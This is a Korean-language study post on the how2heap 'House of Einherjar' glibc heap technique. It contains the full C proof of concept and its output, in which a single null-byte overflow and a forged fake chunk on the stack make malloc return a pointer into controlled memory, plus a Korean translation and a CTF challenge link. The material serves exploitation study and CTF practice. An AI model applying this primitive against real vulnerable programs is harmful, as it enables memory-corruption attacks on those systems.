# How2Heap Study 12 House Of Einherjar

## Tech Overview

Exploiting a single null byte overflow to trick malloc into returning a controlled pointer

## Source

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <malloc.h>

/*
   Credit to st4g3r for publishing this technique
   The House of Enherjar uses an off-by-one overflow with a null byte to control the pointers returned by malloc()
   This technique may result in a more powerful primitive than the Poison Null Byte, but it has the additional requirement of a heap leak. 
*/

int main()
{
	fprintf(stderr, "Welcome to House of Einherjar!\n");
	fprintf(stderr, "Tested in Ubuntu 16.04 64bit.\n");
	fprintf(stderr, "This technique can be used when you have an off-by-one into a malloc'ed region with a null byte.\n");

	uint8_t* a;
	uint8_t* b;
	uint8_t* d;

	fprintf(stderr, "\nWe allocate 0x38 bytes for 'a'\n");
	a = (uint8_t*) malloc(0x38);
	fprintf(stderr, "a: %p\n", a);
    
    int real_a_size = malloc_usable_size(a);
    fprintf(stderr, "Since we want to overflow 'a', we need the 'real' size of 'a' after rounding: %#x\n", real_a_size);

    // create a fake chunk
    fprintf(stderr, "\nWe create a fake chunk wherever we want, in this case we'll create the chunk on the stack\n");
    fprintf(stderr, "However, you can also create the chunk in the heap or the bss, as long as you know its address\n");
    fprintf(stderr, "We set our fwd and bck pointers to point at the fake_chunk in order to pass the unlink checks\n");
    fprintf(stderr, "(although we could do the unsafe unlink technique here in some scenarios)\n");

    size_t fake_chunk[6];

    fake_chunk[0] = 0x100; // prev_size is now used and must equal fake_chunk's size to pass P->bk->size == P->prev_size
    fake_chunk[1] = 0x100; // size of the chunk just needs to be small enough to stay in the small bin
    fake_chunk[2] = (size_t) fake_chunk; // fwd
    fake_chunk[3] = (size_t) fake_chunk; // bck
    fake_chunk[4] = (size_t) fake_chunk; //fwd_nextsize
    fake_chunk[5] = (size_t) fake_chunk; //bck_nextsize
    
    
    fprintf(stderr, "Our fake chunk at %p looks like:\n", fake_chunk);
    fprintf(stderr, "prev_size (not used): %#lx\n", fake_chunk[0]);
    fprintf(stderr, "size: %#lx\n", fake_chunk[1]);
    fprintf(stderr, "fwd: %#lx\n", fake_chunk[2]);
    fprintf(stderr, "bck: %#lx\n", fake_chunk[3]);
    fprintf(stderr, "fwd_nextsize: %#lx\n", fake_chunk[4]);
    fprintf(stderr, "bck_nextsize: %#lx\n", fake_chunk[5]);

	/* In this case it is easier if the chunk size attribute has a least significant byte with
	 * a value of 0x00. The least significant byte of this will be 0x00, because the size of 
	 * the chunk includes the amount requested plus some amount required for the metadata. */
	b = (uint8_t*) malloc(0xf8);
    int real_b_size = malloc_usable_size(b);

	fprintf(stderr, "\nWe allocate 0xf8 bytes for 'b'.\n");
	fprintf(stderr, "b: %p\n", b);

	uint64_t* b_size_ptr = (uint64_t*)(b - 8);
    /* This technique works by overwriting the size metadata of an allocated chunk as well as the prev_inuse bit*/

	fprintf(stderr, "\nb.size: %#lx\n", *b_size_ptr);
	fprintf(stderr, "b.size is: (0x100) | prev_inuse = 0x101\n");
	fprintf(stderr, "We overflow 'a' with a single null byte into the metadata of 'b'\n");
	a[real_a_size] = 0; 
	fprintf(stderr, "b.size: %#lx\n", *b_size_ptr);
    fprintf(stderr, "This is easiest if b.size is a multiple of 0x100 so you "
           "don't change the size of b, only its prev_inuse bit\n");
    fprintf(stderr, "If it had been modified, we would need a fake chunk inside "
           "b where it will try to consolidate the next chunk\n");

    // Write a fake prev_size to the end of a
    fprintf(stderr, "\nWe write a fake prev_size to the last %lu bytes of a so that "
           "it will consolidate with our fake chunk\n", sizeof(size_t));
    size_t fake_size = (size_t)((b-sizeof(size_t)*2) - (uint8_t*)fake_chunk);
    fprintf(stderr, "Our fake prev_size will be %p - %p = %#lx\n", b-sizeof(size_t)*2, fake_chunk, fake_size);
    *(size_t*)&a[real_a_size-sizeof(size_t)] = fake_size;

    //Change the fake chunk's size to reflect b's new prev_size
    fprintf(stderr, "\nModify fake chunk's size to reflect b's new prev_size\n");
    fake_chunk[1] = fake_size;

    // free b and it will consolidate with our fake chunk
    fprintf(stderr, "Now we free b and this will consolidate with our fake chunk since b prev_inuse is not set\n");
    free(b);
    fprintf(stderr, "Our fake chunk size is now %#lx (b.size + fake_prev_size)\n", fake_chunk[1]);

    //if we allocate another chunk before we free b we will need to 
    //do two things: 
    //1) We will need to adjust the size of our fake chunk so that
    //fake_chunk + fake_chunk's size points to an area we control
    //2) we will need to write the size of our fake chunk
    //at the location we control. 
    //After doing these two things, when unlink gets called, our fake chunk will
    //pass the size(P) == prev_size(next_chunk(P)) test. 
    //otherwise we need to make sure that our fake chunk is up against the
    //wilderness

    fprintf(stderr, "\nNow we can call malloc() and it will begin in our fake chunk\n");
    d = malloc(0x200);
    fprintf(stderr, "Next malloc(0x200) is at %p\n", d);
}
```

## Output

```
Welcome to House of Einherjar!
Tested in Ubuntu 16.04 64bit.
This technique can be used when you have an off-by-one into a malloc'ed region with a null byte.

We allocate 0x38 bytes for 'a'
a: 0x174b010
Since we want to overflow 'a', we need the 'real' size of 'a' after rounding: 0x38

We create a fake chunk wherever we want, in this case we'll create the chunk on the stack
However, you can also create the chunk in the heap or the bss, as long as you know its address
We set our fwd and bck pointers to point at the fake_chunk in order to pass the unlink checks
(although we could do the unsafe unlink technique here in some scenarios)
Our fake chunk at 0x7fffd407c150 looks like:
prev_size (not used): 0x100
size: 0x100
fwd: 0x7fffd407c150
bck: 0x7fffd407c150
fwd_nextsize: 0x7fffd407c150
bck_nextsize: 0x7fffd407c150

We allocate 0xf8 bytes for 'b'.
b: 0x174b050

b.size: 0x101
b.size is: (0x100) | prev_inuse = 0x101
We overflow 'a' with a single null byte into the metadata of 'b'
b.size: 0x100
This is easiest if b.size is a multiple of 0x100 so you don't change the size of b, only its prev_inuse bit
If it had been modified, we would need a fake chunk inside b where it will try to consolidate the next chunk

We write a fake prev_size to the last 8 bytes of a so that it will consolidate with our fake chunk
Our fake prev_size will be 0x174b040 - 0x7fffd407c150 = 0xffff80002d6ceef0

Modify fake chunk's size to reflect b's new prev_size
Now we free b and this will consolidate with our fake chunk since b prev_inuse is not set
Our fake chunk size is now 0xffff80002d6efeb1 (b.size + fake_prev_size)

Now we can call malloc() and it will begin in our fake chunk
Next malloc(0x200) is at 0x7fffd407c160
```

## 개요 번역

Exploiting a single null byte overflow to trick malloc into returning a controlled pointer


(번역은 완벽하지 않으며, 추후 수정될 수 있습니다.)

## 출력 번역

```
Welcome to House of Einherjar!
House of Einherjar 에 오신것을 환영합니다!

Tested in Ubuntu 16.04 64bit.
우분투 16.04 64 비트에서 테스트 되었습니다.

This technique can be used when you have an off-by-one into a malloc'ed region with a null byte.
이 기술은 malloc 으로 할당받은 구역에서 null 바이트를 통한 off-by-one 취약점을 가지고 있을 때 사용할 수 있습니다.

We allocate 0x38 bytes for 'a'
우리는 'a' 를 넣을 0x38 바이트 공간을 할당했습니다.

a: 0x174b010

Since we want to overflow 'a', we need the 'real' size of 'a' after rounding: 0x38
'a'를 오버플로우 하기 위해서, 'a' 의 올림된 '진짜' 크기를 알아야 할 필요가 있습니다.

We create a fake chunk wherever we want, in this case we'll create the chunk on the stack
우리가 원하는 위치 어디든지 가짜 청크를 만듭니다. 이 상황에서는 스택에 청크를 만들 것입니다.

However, you can also create the chunk in the heap or the bss, as long as you know its address
참고로, 당신이 그 주소를 알고있는 한, 힙 영역이나 bss 영역에 청크를 만들 수 있습니다.

We set our fwd and bck pointers to point at the fake_chunk in order to pass the unlink checks
unlink 검사를 건너뛰기 위해서 fake_chunk 를 가리키도록 fwd 와 bck 포인터를 설정합니다.

(although we could do the unsafe unlink technique here in some scenarios)
(그러나 여기서 unsafe unlink 기술을 몇몇 상황에서는 사용할 수 있습니다.)

Our fake chunk at 0x7fffd407c150 looks like:
가짜 청크는 0x7fffd407c150 이고 값들은 다음과 같습니다.

prev_size (not used): 0x100
size: 0x100
fwd: 0x7fffd407c150
bck: 0x7fffd407c150
fwd_nextsize: 0x7fffd407c150
bck_nextsize: 0x7fffd407c150

We allocate 0xf8 bytes for 'b'.
'b' 를 넣기 위하여 0xf8 바이트를 할당합니다.

b: 0x174b050

b.size: 0x101
b.size is: (0x100) | prev_inuse = 0x101

We overflow 'a' with a single null byte into the metadata of 'b'
'b' 의 데이터까지 'a' 를 null 바이트 1개로 오버플로우합니다.

b.size: 0x100

This is easiest if b.size is a multiple of 0x100 so you don't change the size of b, only its prev_inuse bit
이 상황이 제일 쉽습니다. 만약 b.size 가 0x100의 배수라면, b 의 크기를 바꿀 필요 없이 오직 prev_inuse 비트만 바꾸면 됩니다.

If it had been modified, we would need a fake chunk inside b where it will try to consolidate the next chunk
만약 이것이 수정되었다면, 다음 청크를 합치기 위해서 b 안의 가짜 청크가 필요할 것입니다.

We write a fake prev_size to the last 8 bytes of a so that it will consolidate with our fake chunk
가짜 prev_size 를 마지막 8바이트를 우리의 가짜 청크와 합쳐지기 위해서 덮어씁니다.

Our fake prev_size will be 0x174b040 - 0x7fffd407c150 = 0xffff80002d6ceef0
우리의 가짜 prev_size 는 0x174b040 - 0x7fffd407c150 = 0xffff80002d6ceef0 가 될 것입니다.

Modify fake chunk's size to reflect b's new prev_size
가짜 청크의 크기를 b의 새로운 크기를 반영하여 수정합니다.

Now we free b and this will consolidate with our fake chunk since b prev_inuse is not set
이제 b를 해제하고, 이것은 b의 prev_inuse 가 설정되어있지 않기 때문에 우리의 가짜 청크와 병합될 것입니다.

Our fake chunk size is now 0xffff80002d6efeb1 (b.size + fake_prev_size)
가짜 청크의 크기는 이제 0xffff80002d6efeb1 입니다.

Now we can call malloc() and it will begin in our fake chunk
이제 malloc을 호출하고 이것은 우리의 가짜 청크에서 시작할 것입니다.

Next malloc(0x200) is at 0x7fffd407c160
다음 malloc(0x200) 의 값은 0x7fffd407c160 입니다.

```

## Applicable CTF Challenges
(적용 가능한 CTF 문제들)

* Seccon 2016-tinypad - [블로그]() / [바이너리](https://gist.github.com/hhc0null/4424a2a19a60c7f44e543e32190aaabf)